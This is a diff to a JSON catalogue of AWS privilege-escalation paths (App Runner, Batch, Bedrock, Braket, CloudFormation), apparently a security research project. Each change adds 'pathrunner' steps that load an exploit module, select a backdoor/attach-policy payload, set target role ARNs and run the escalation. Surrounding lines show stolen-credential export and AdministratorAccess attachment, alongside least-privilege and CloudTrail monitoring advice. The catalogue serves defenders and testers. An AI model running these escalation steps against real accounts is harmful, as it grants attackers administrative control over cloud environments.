@@ -44,6 +44,38 @@
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrator access by listing IAM users (should now succeed)"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use apprunner-001",
+          "description": "Load the apprunner-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "recommendation": "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid administrative service roles** - Very rarely does an App Runner service need administrative access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAppRunnerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"apprunner.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual App Runner service creation followed by immediate execution\n- Monitor CloudTrail for service creation by principals who do not usually create services\n- Monitor CloudTrail for roles being passed to App Runner that haven't been used before\n- Monitor and alert on App Runner service creation with privileged roles\n- Regularly audit App Runner services for excessive IAM permissions\n- Regularly audit all IAM roles that trust the App Runner service and down-scope any roles with administrative access\n",
@@ -278,8 +310,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -343,6 +380,33 @@
           "step": 7,
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrator access by listing IAM users (should now succeed)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use apprunner-002",
+          "description": "Load the apprunner-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -565,8 +629,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -656,6 +725,48 @@
           "step": 4,
           "command": "aws iam list-attached-user-policies \\\n  --user-name STARTING_USER\n",
           "description": "Verify privilege escalation success by confirming AdministratorAccess is now attached to the starting user."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use batch-001",
+          "description": "Load the batch-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ADMIN_ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ADMIN_ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set EXECUTION_ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the EXECUTION_ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set JOB_QUEUE target-batch-job-queue",
+          "description": "Set the JOB_QUEUE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 8,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -877,8 +988,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -956,6 +1072,43 @@
           "step": 4,
           "command": "aws iam list-attached-user-policies \\\n  --user-name STARTING_USER\n",
           "description": "Verify that AdministratorAccess is now attached to the starting user."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use batch-002",
+          "description": "Load the batch-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set JOB_DEFINITION target-job-definition:1",
+          "description": "Set the JOB_DEFINITION option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set JOB_QUEUE target-batch-job-queue",
+          "description": "Set the JOB_QUEUE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -1164,8 +1317,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -1291,6 +1449,53 @@
           "step": 6,
           "command": "aws iam list-attached-user-policies \\\n  --user-name STARTING_USER\n",
           "description": "Verify that AdministratorAccess is now attached to the starting user."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use batch-003",
+          "description": "Load the batch-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ADMIN_ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ADMIN_ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set EXECUTION_ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the EXECUTION_ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set SUBNET_ID subnet-0123456789abcdef0",
+          "description": "Set the SUBNET_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner set SECURITY_GROUP_ID sg-0123456789abcdef0",
+          "description": "Set the SECURITY_GROUP_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 8,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 9,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -1537,8 +1742,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -1627,6 +1837,38 @@
           "step": 5,
           "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
           "description": "Use the stolen credentials to assume the privileged role's permissions"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use bedrock-001",
+          "description": "Load the bedrock-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -1816,8 +2058,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -1873,6 +2120,38 @@
           "step": 5,
           "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
           "description": "Use the stolen credentials to assume the privileged role's permissions"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use bedrock-002",
+          "description": "Load the bedrock-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set INTERPRETER_ID target-interpreter-id",
+          "description": "Set the INTERPRETER_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -2084,8 +2363,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -2183,6 +2467,38 @@
           "step": 6,
           "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
           "description": "Use the stolen credentials to act as the runtime execution role"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use bedrock-003",
+          "description": "Load the bedrock-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set EXECUTION_ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the EXECUTION_ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -2362,8 +2678,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -2419,6 +2740,38 @@
           "step": 5,
           "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>\nexport AWS_SESSION_TOKEN=<Token from step 4>\naws sts get-caller-identity\n",
           "description": "Use the stolen credentials to act as the resource execution role"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use bedrock-004",
+          "description": "Load the bedrock-004 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set TARGET_RUNTIME_ARN arn:aws:bedrock::123456789012:provisioned-model/target-model",
+          "description": "Set the TARGET_RUNTIME_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -2624,8 +2977,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -2733,6 +3091,38 @@
           "step": 6,
           "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
           "description": "Use the stolen credentials to act as the harness execution role"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use bedrock-005",
+          "description": "Load the bedrock-005 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -2915,8 +3305,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -3010,6 +3405,23 @@
           "step": 6,
           "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
           "description": "Use the stolen credentials to act as the browser execution role"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use bedrock-006",
+          "description": "Load the bedrock-006 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -3149,8 +3561,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -3204,6 +3621,23 @@
           "step": 5,
           "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>\nexport AWS_SESSION_TOKEN=<Token from step 4>\naws sts get-caller-identity\n",
           "description": "Use the stolen credentials to act as the browser execution role"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use bedrock-007",
+          "description": "Load the bedrock-007 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set BROWSER_ID target-browser-id",
+          "description": "Set the BROWSER_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -3369,8 +3803,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -3447,6 +3886,38 @@
           "step": 3,
           "command": "aws braket get-job \\\n  --job-arn JOB_ARN \\\n  --query 'status' \\\n  --output text\n",
           "description": "Poll job status. Once the job reaches COMPLETED, the privilege escalation has succeeded and AdministratorAccess is attached to the starting user."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use braket-001",
+          "description": "Load the braket-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -3575,8 +4046,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -3621,6 +4097,38 @@
           "step": 3,
           "command": "# Access the newly created resources (e.g., IAM user, Lambda function)",
           "description": "Use the elevated privileges of the created resources"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use cloudformation-001",
+          "description": "Load the cloudformation-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -3796,8 +4304,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -3863,6 +4376,38 @@
           "step": 7,
           "command": "# Configure AWS CLI with the temporary credentials from step 6\n# Now you have administrator access\naws iam list-users\n",
           "description": "Verify administrator access"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use cloudformation-002",
+          "description": "Load the cloudformation-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set STACK_NAME target-cloudformation-stack",
+          "description": "Set the STACK_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -4043,8 +4588,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -4154,6 +4704,38 @@
           "step": 7,
           "command": "# Use the newly created resources to escalate privileges\n# For example, assume a newly created IAM role:\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \\\n  --role-session-name escalation-session\n",
           "description": "Leverage the newly created resources to escalate privileges, such as assuming a newly created IAM role with elevated permissions"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use cloudformation-003",
+          "description": "Load the cloudformation-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set EXECUTION_ROLE_NAME TargetExecutionRoleName",
+          "description": "Set the EXECUTION_ROLE_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -4299,8 +4881,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -4411,6 +4998,38 @@
           "step": 8,
           "command": "# Use the newly created resources to escalate privileges\n# For example, assume a newly created IAM role:\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/CREATED_ROLE \\\n  --role-session-name escalation-session\n",
           "description": "Leverage the newly created resources to escalate privileges, such as assuming a newly created IAM role with elevated permissions"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use cloudformation-004",
+          "description": "Load the cloudformation-004 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set STACKSET_NAME target-stackset",
+          "description": "Set the STACKSET_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -4567,8 +5186,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -4665,6 +5289,38 @@
           "step": 8,
           "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \\\n  --role-session-name escalation-session\n",
           "description": "Assume the newly created escalated admin role and verify administrator access"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use cloudformation-005",
+          "description": "Load the cloudformation-005 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set STACK_NAME target-cloudformation-stack",
+          "description": "Set the STACK_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -4835,8 +5491,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -4891,6 +5552,38 @@
